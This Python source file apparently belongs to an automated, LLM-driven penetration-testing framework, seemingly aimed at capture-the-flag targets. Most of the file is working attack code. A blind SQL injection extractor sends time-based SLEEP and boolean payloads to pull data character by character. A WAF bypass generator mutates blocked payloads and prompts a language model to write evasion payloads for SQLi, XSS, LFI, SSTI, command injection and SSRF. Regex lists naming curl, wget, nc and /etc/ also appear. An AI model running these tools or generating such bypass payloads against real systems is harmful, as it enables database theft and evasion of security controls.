"""Phase 2 specialist tool modules: BlindSQLiExtractor, WAFBypassGenerator.

These modules register as callable tools in ToolRouter, available to both
Phase 2 workers and Phase 3 ReAct agent.
"""
from __future__ import annotations

import logging
import math
import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

import requests

from autopnex.evasion.payload_mutator import PayloadMutator
from autopnex.orchestrator.llm_client import LLMClient

from .flag_engine import FlagEngine

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# BlindSQLiExtractor
# ---------------------------------------------------------------------------


@dataclass
class ExtractionResult:
    """Result of a blind SQL injection extraction attempt.

    Attributes:
        success: Whether extraction completed and a valid flag was found.
        extracted_value: The extracted string (may be partial on failure).
        unknown_positions: List of character positions that could not be determined.
        mode_used: The extraction mode that was ultimately used ("time" or "boolean").
        requests_made: Total number of HTTP requests sent during extraction.
        flag_validated: Whether the extracted value was validated by FlagEngine.
    """

    success: bool
    extracted_value: str = ""
    unknown_positions: List[int] = field(default_factory=list)
    mode_used: str = "time"
    requests_made: int = 0
    flag_validated: bool = False


class BlindSQLiExtractor:
    """Blind SQL injection data extraction via binary search.

    Supports both time-based and boolean-based extraction modes.
    Uses binary search over printable ASCII (32-126) to minimize requests
    per character position (at most ceil(log2(95)) + 1 = 8 requests).

    Registered as tool "blind_sqli_extract" in ToolRouter.

    Args:
        session: HTTP session for making requests.
        target_url: Base URL of the target application.
        flag_engine: FlagEngine instance for validating extracted candidates.
        timeout_per_request: Timeout in seconds for each HTTP request.
        max_unknown_consecutive: Number of consecutive unknown positions before
            terminating extraction early.
    """

    # ASCII printable range for binary search
    ASCII_LOW = 32
    ASCII_HIGH = 126
    # Maximum requests per character: ceil(log2(95)) + 1 = 8
    MAX_REQUESTS_PER_CHAR = int(math.ceil(math.log2(ASCII_HIGH - ASCII_LOW + 1))) + 1

    # Number of consecutive timeouts before falling back from time to boolean mode
    TIME_MODE_INSTABILITY_THRESHOLD = 3

    def __init__(
        self,
        session: requests.Session,
        target_url: str,
        flag_engine: FlagEngine,
        timeout_per_request: float = 5.0,
        max_unknown_consecutive: int = 3,
    ) -> None:
        self._session = session
        self._target_url = target_url
        self._flag_engine = flag_engine
        self._timeout_per_request = timeout_per_request
        self._max_unknown_consecutive = max_unknown_consecutive

        # Internal state reset per extraction call
        self._requests_made = 0
        self._injection_point = ""
        self._param_name = ""
        self._query_template = ""
        self._consecutive_timeouts = 0
        self._boolean_baseline: Optional[str] = None

    def extract(
        self,
        injection_point: str,
        param_name: str,
        query_template: str,
        mode: str = "time",
        max_length: int = 64,
    ) -> ExtractionResult:
        """Extract data character-by-character using blind SQL injection.

        Args:
            injection_point: URL with {INJECT} placeholder marking where
                the payload is inserted.
            param_name: Name of the parameter being injected.
            query_template: SQL condition template with {CHAR} and {POS}
                placeholders for the binary search comparison.
                Example: "ASCII(SUBSTRING(password,{POS},1))>{CHAR}"
            mode: Extraction mode - "time" for time-based, "boolean" for
                boolean-based. Defaults to "time".
            max_length: Maximum number of characters to extract.

        Returns:
            ExtractionResult with extraction outcome and metadata.
        """
        # Reset internal state
        self._requests_made = 0
        self._injection_point = injection_point
        self._param_name = param_name
        self._query_template = query_template
        self._consecutive_timeouts = 0

        current_mode = mode
        extracted_chars: List[str] = []
        unknown_positions: List[int] = []
        consecutive_unknowns = 0

        # Establish boolean baseline if starting in boolean mode
        if current_mode == "boolean":
            self._boolean_baseline = self._establish_boolean_baseline()

        for position in range(1, max_length + 1):
            char = self._binary_search_char(position, current_mode)

            if char is None:
                # Position is unknown
                unknown_positions.append(position)
                extracted_chars.append("?")
                consecutive_unknowns += 1

                # Check if we should terminate early
                if consecutive_unknowns >= self._max_unknown_consecutive:
                    logger.info(
                        "Terminating extraction: %d consecutive unknowns "
                        "exceeded threshold %d at position %d",
                        consecutive_unknowns,
                        self._max_unknown_consecutive,
                        position,
                    )
                    break

                # Check if time mode is unstable and fallback is available
                if (
                    current_mode == "time"
                    and self._consecutive_timeouts
                    >= self.TIME_MODE_INSTABILITY_THRESHOLD
                ):
                    logger.info(
                        "Time-based mode unstable (%d consecutive timeouts), "
                        "attempting fallback to boolean-based mode",
                        self._consecutive_timeouts,
                    )
                    self._boolean_baseline = self._establish_boolean_baseline()
                    if self._boolean_baseline is not None:
                        current_mode = "boolean"
                        self._consecutive_timeouts = 0
                        logger.info("Fallback to boolean-based mode successful")
                    else:
                        logger.warning(
                            "Boolean baseline could not be established; "
                            "continuing with time-based mode"
                        )
            else:
                extracted_chars.append(char)
                consecutive_unknowns = 0
                # Reset timeout counter on success
                if current_mode == "time":
                    self._consecutive_timeouts = 0

        # Build the extracted value (strip trailing unknowns)
        extracted_value = "".join(extracted_chars).rstrip("?")

        # Validate against FlagEngine
        flag_validated = False
        if extracted_value:
            candidates = self._flag_engine.scan(extracted_value)
            if candidates:
                flag_validated = True
                logger.info(
                    "Flag validated by FlagEngine: %s", candidates[0].value
                )

        success = flag_validated

        return ExtractionResult(
            success=success,
            extracted_value=extracted_value,
            unknown_positions=unknown_positions,
            mode_used=current_mode,
            requests_made=self._requests_made,
            flag_validated=flag_validated,
        )

    def _binary_search_char(self, position: int, mode: str) -> Optional[str]:
        """Binary search over ASCII 32-126 for the character at a given position.

        Uses at most ceil(log2(95)) + 1 = 8 requests per character.
        Returns None if the character cannot be determined (timeout/ambiguous).

        Args:
            position: The 1-based character position to extract.
            mode: "time" or "boolean" extraction mode.

        Returns:
            The extracted character, or None if unknown.
        """
        low = self.ASCII_LOW
        high = self.ASCII_HIGH
        requests_this_char = 0

        while low < high and requests_this_char < self.MAX_REQUESTS_PER_CHAR:
            mid = (low + high) // 2
            condition = self._query_template.replace(
                "{POS}", str(position)
            ).replace("{CHAR}", str(mid))

            requests_this_char += 1
            try:
                if mode == "time":
                    result = self._time_based_check(condition)
                else:
                    result = self._boolean_based_check(condition)
            except TimeoutError:
                # Mark as unknown on timeout
                if mode == "time":
                    self._consecutive_timeouts += 1
                return None

            if result:
                # Condition is true: ASCII value > mid
                low = mid + 1
            else:
                # Condition is false: ASCII value <= mid
                high = mid

        if low == high and requests_this_char <= self.MAX_REQUESTS_PER_CHAR:
            char = chr(low)
            # Verify it's in printable range
            if self.ASCII_LOW <= low <= self.ASCII_HIGH:
                return char

        return None

    def _time_based_check(self, condition: str) -> bool:
        """Send a time-based blind SQLi payload and check if response is delayed.

        Injects a payload that causes a time delay (e.g., via SLEEP or
        BENCHMARK) when the condition is true.

        Args:
            condition: The SQL condition to test (e.g., "ASCII(...)>65").

        Returns:
            True if the response was delayed (condition is true).

        Raises:
            TimeoutError: If the request times out unexpectedly.
        """
        # Build the time-based payload: IF(condition, SLEEP(timeout/2), 0)
        sleep_time = self._timeout_per_request / 2
        payload = f"' AND IF({condition},SLEEP({sleep_time}),0)-- -"

        url = self._injection_point.replace("{INJECT}", payload)

        self._requests_made += 1
        start_time = time.time()

        try:
            response = self._session.get(
                url, timeout=self._timeout_per_request, allow_redirects=True
            )
            elapsed = time.time() - start_time

            # If response took longer than sleep_time threshold, condition is true
            # Use 80% of sleep_time as threshold to account for network jitter
            return elapsed >= (sleep_time * 0.8)

        except requests.exceptions.Timeout:
            # Request timed out entirely - ambiguous result
            raise TimeoutError(
                f"Request timed out after {self._timeout_per_request}s"
            )
        except requests.exceptions.RequestException as e:
            logger.warning("Request failed during time-based check: %s", e)
            raise TimeoutError(f"Request failed: {e}")

    def _boolean_based_check(self, condition: str) -> bool:
        """Send a boolean-based blind SQLi payload and compare response to baseline.

        Injects a payload that alters the response content when the condition
        is true vs false.

        Args:
            condition: The SQL condition to test (e.g., "ASCII(...)>65").

        Returns:
            True if the response matches the "true" baseline (condition is true).

        Raises:
            TimeoutError: If the request times out.
        """
        payload = f"' AND {condition}-- -"
        url = self._injection_point.replace("{INJECT}", payload)

        self._requests_made += 1

        try:
            response = self._session.get(
                url, timeout=self._timeout_per_request, allow_redirects=True
            )

            # Compare response to baseline
            if self._boolean_baseline is not None:
                return self._responses_match(response.text, self._boolean_baseline)
            else:
                # No baseline - use content length heuristic
                return len(response.text) > 0

        except requests.exceptions.Timeout:
            raise TimeoutError(
                f"Request timed out after {self._timeout_per_request}s"
            )
        except requests.exceptions.RequestException as e:
            logger.warning("Request failed during boolean-based check: %s", e)
            raise TimeoutError(f"Request failed: {e}")

    def _establish_boolean_baseline(self) -> Optional[str]:
        """Establish a baseline response for boolean-based extraction.

        Sends a known-true condition (1=1) to capture what a "true" response
        looks like.

        Returns:
            The response body for a true condition, or None if baseline
            cannot be established.
        """
        true_payload = "' AND 1=1-- -"
        url = self._injection_point.replace("{INJECT}", true_payload)

        self._requests_made += 1

        try:
            response = self._session.get(
                url, timeout=self._timeout_per_request, allow_redirects=True
            )
            return response.text
        except requests.exceptions.RequestException as e:
            logger.warning("Failed to establish boolean baseline: %s", e)
            return None

    def _responses_match(self, response_text: str, baseline: str) -> bool:
        """Compare a response to the baseline to determine if condition was true.

        Uses content length similarity as the primary comparison metric.
        Two responses are considered matching if their lengths are within
        5% of each other.

        Args:
            response_text: The response body to compare.
            baseline: The baseline response body (true condition).

        Returns:
            True if the response matches the baseline (condition is true).
        """
        if not baseline:
            return len(response_text) > 0

        baseline_len = len(baseline)
        response_len = len(response_text)

        if baseline_len == 0:
            return response_len == 0

        # Allow 5% tolerance for dynamic content
        tolerance = max(baseline_len * 0.05, 10)
        return abs(response_len - baseline_len) <= tolerance


# ---------------------------------------------------------------------------
# WAFBypassGenerator
# ---------------------------------------------------------------------------

# Patterns used to verify generated payloads match the target vulnerability class
_VULN_CLASS_PATTERNS: Dict[str, List[re.Pattern]] = {
    "sqli": [
        re.compile(r"(?i)(select|union|insert|update|delete|drop|alter|create|from|where|and|or|order\s+by|group\s+by|having|limit|sleep|benchmark|waitfor|delay|concat|char\(|0x[0-9a-f]+|--|#|/\*)", re.IGNORECASE),
        re.compile(r"['\"]?\s*(OR|AND)\s+\d+\s*=\s*\d+", re.IGNORECASE),
    ],
    "xss": [
        re.compile(r"(?i)(<script|<svg|<img|<iframe|<body|<input|<details|<marquee|onerror|onload|onfocus|onmouseover|onclick|javascript:|alert|confirm|prompt|document\.|eval\()", re.IGNORECASE),
    ],
    "lfi": [
        re.compile(r"(\.\./|\.\.\\|/etc/|/proc/|/var/|php://|file://|data://|expect://|input://|filter/|convert\.|%2e%2e|%252e)", re.IGNORECASE),
    ],
    "ssti": [
        re.compile(r"(\{\{|\{%|<%|#\{|\$\{|__class__|__mro__|__subclasses__|__globals__|__builtins__|config\.|request\.|lipsum|cycler|joiner|namespace)", re.IGNORECASE),
    ],
    "cmdi": [
        re.compile(r"(;|\||&&|\$\(|`|>\s*/|<\s*/|\bcat\b|\bls\b|\bwhoami\b|\bid\b|\bping\b|\bcurl\b|\bwget\b|\bnc\b|\bbash\b|\bsh\b|\bpython\b|\bperl\b|\bruby\b)", re.IGNORECASE),
    ],
    "ssrf": [
        re.compile(r"(http://|https://|gopher://|dict://|ftp://|file://|127\.0\.0\.1|localhost|0\.0\.0\.0|169\.254\.|10\.\d|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)", re.IGNORECASE),
    ],
}


@dataclass
class BypassResult:
    """Result of WAF bypass payload generation."""

    alternatives: List[str]
    source: str = "static"  # "static" | "llm"
    llm_rounds_used: int = 0
    cached: bool = False


class WAFBypassGenerator:
    """WAF evasion payload generation: static mutations first, LLM fallback.

    Registered as tool "waf_bypass_generate" in ToolRouter.
    """

    def __init__(
        self,
        llm_client: Optional[LLMClient] = None,
        max_llm_rounds: int = 3,
        payload_mutator: Optional[PayloadMutator] = None,
    ) -> None:
        self._llm_client = llm_client
        self._max_llm_rounds = max_llm_rounds
        self._mutator = payload_mutator or PayloadMutator()
        self._cache: Dict[str, List[str]] = {}

    def generate_bypass(
        self,
        blocked_payload: str,
        waf_response: str,
        vulnerability_class: str,
    ) -> BypassResult:
        """Generate WAF bypass alternatives for a blocked payload.

        Ordering: cache check → static mutations → LLM fallback.

        Args:
            blocked_payload: The payload that was blocked by the WAF.
            waf_response: The WAF's response body (first 500 chars).
            vulnerability_class: Target vulnerability type (sqli, xss, lfi, ssti, cmdi, ssrf).

        Returns:
            BypassResult with alternative payloads and metadata.
        """
        # 1. Check cache first
        cached = self._check_cache(blocked_payload)
        if cached is not None:
            return BypassResult(
                alternatives=cached,
                source="static",
                llm_rounds_used=0,
                cached=True,
            )

        # 2. Try static mutations first
        static_alternatives = self._try_static_mutations(blocked_payload, vulnerability_class)
        if static_alternatives:
            # Cache the result
            self._cache[blocked_payload] = static_alternatives
            return BypassResult(
                alternatives=static_alternatives,
                source="static",
                llm_rounds_used=0,
                cached=False,
            )

        # 3. Fall back to LLM generation if available
        if self._llm_client and self._llm_client.enabled:
            llm_alternatives: List[str] = []
            rounds_used = 0

            for round_num in range(self._max_llm_rounds):
                rounds_used += 1
                new_payloads = self._llm_generate(
                    blocked_payload, waf_response, vulnerability_class
                )
                # Validate and collect payloads matching the vulnerability class
                valid_payloads = [
                    p for p in new_payloads
                    if self._matches_vuln_class(p, vulnerability_class)
                ]
                llm_alternatives.extend(valid_payloads)

                # Stop if we have enough alternatives (up to 5)
                if len(llm_alternatives) >= 5:
                    llm_alternatives = llm_alternatives[:5]
                    break

            if llm_alternatives:
                # Cache the result
                self._cache[blocked_payload] = llm_alternatives
                return BypassResult(
                    alternatives=llm_alternatives,
                    source="llm",
                    llm_rounds_used=rounds_used,
                    cached=False,
                )

            # LLM rounds exhausted with no valid results
            return BypassResult(
                alternatives=[],
                source="llm",
                llm_rounds_used=rounds_used,
                cached=False,
            )

        # No LLM available and static mutations failed
        return BypassResult(
            alternatives=[],
            source="static",
            llm_rounds_used=0,
            cached=False,
        )

    def _try_static_mutations(self, payload: str, vuln_class: str) -> List[str]:
        """Apply mutations from existing evasion library.

        Uses PayloadMutator to generate variants based on the vulnerability
        class and a generic WAF vendor profile.

        Args:
            payload: The blocked payload to mutate.
            vuln_class: Vulnerability class (sqli, xss, lfi, ssti, cmdi, ssrf).

        Returns:
            List of mutated payload strings (up to 5), or empty list if
            no valid mutations produced.
        """
        variants = self._mutator.mutate(payload, vuln_class, "generic")
        # Extract just the payload strings and validate they match vuln class
        alternatives: List[str] = []
        for variant in variants:
            mutated_payload = variant["payload"]
            if self._matches_vuln_class(mutated_payload, vuln_class):
                alternatives.append(mutated_payload)
            if len(alternatives) >= 5:
                break

        return alternatives

    def _llm_generate(
        self, payload: str, waf_response: str, vuln_class: str
    ) -> List[str]:
        """Request LLM to generate up to 5 alternative payloads.

        Args:
            payload: The blocked payload.
            waf_response: The WAF's response (first 500 chars).
            vuln_class: Target vulnerability class.

        Returns:
            List of generated payload strings (up to 5).
        """
        if not self._llm_client or not self._llm_client.enabled:
            return []

        system_prompt = (
            "You are a WAF bypass expert. Generate alternative payloads that achieve "
            "the same exploitation effect as the blocked payload but evade the WAF. "
            "Use techniques like encoding variations, syntax alternatives, comment "
            "insertion, case manipulation, and protocol-level tricks. "
            "Return ONLY the payloads, one per line, with no explanations or numbering. "
            f"Target vulnerability class: {vuln_class}. "
            "Generate exactly 5 alternative payloads."
        )

        user_prompt = (
            f"The following payload was blocked by a WAF:\n"
            f"```\n{payload}\n```\n\n"
            f"WAF response (first 500 chars):\n"
            f"```\n{waf_response[:500]}\n```\n\n"
            f"Generate 5 alternative {vuln_class} payloads that achieve the same "
            f"effect but bypass the WAF. Return only the raw payloads, one per line."
        )

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt},
        ]

        try:
            response = self._llm_client.chat(
                messages=messages,
                temperature=0.7,
                max_tokens=800,
            )
            content = response.get("content", "")
            if not content:
                return []

            # Parse response: one payload per line, strip empty lines
            payloads = [
                line.strip()
                for line in content.strip().split("\n")
                if line.strip() and not line.strip().startswith("#")
            ]

            # Remove any numbering prefixes (e.g., "1. ", "1) ", "- ")
            cleaned: List[str] = []
            for p in payloads:
                # Strip common numbering patterns
                cleaned_p = re.sub(r"^\d+[\.\)]\s*", "", p)
                cleaned_p = re.sub(r"^[-*]\s*", "", cleaned_p)
                # Strip backticks if the LLM wrapped them in code
                cleaned_p = cleaned_p.strip("`")
                if cleaned_p:
                    cleaned.append(cleaned_p)

            return cleaned[:5]

        except Exception as e:
            logger.warning("WAF bypass LLM generation failed: %s", e)
            return []

    def _check_cache(self, payload: str) -> Optional[List[str]]:
        """Return cached alternatives if this payload was seen before.

        Args:
            payload: The blocked payload to look up.

        Returns:
            List of cached alternative payloads, or None if not cached.
        """
        return self._cache.get(payload)

    def _matches_vuln_class(self, payload: str, vuln_class: str) -> bool:
        """Verify a generated payload matches the target vulnerability class.

        Args:
            payload: The generated payload to validate.
            vuln_class: Expected vulnerability class.

        Returns:
            True if the payload contains patterns consistent with the
            vulnerability class.
        """
        patterns = _VULN_CLASS_PATTERNS.get(vuln_class)
        if not patterns:
            # Unknown vuln class — accept all payloads
            return True

        return any(pattern.search(payload) for pattern in patterns)
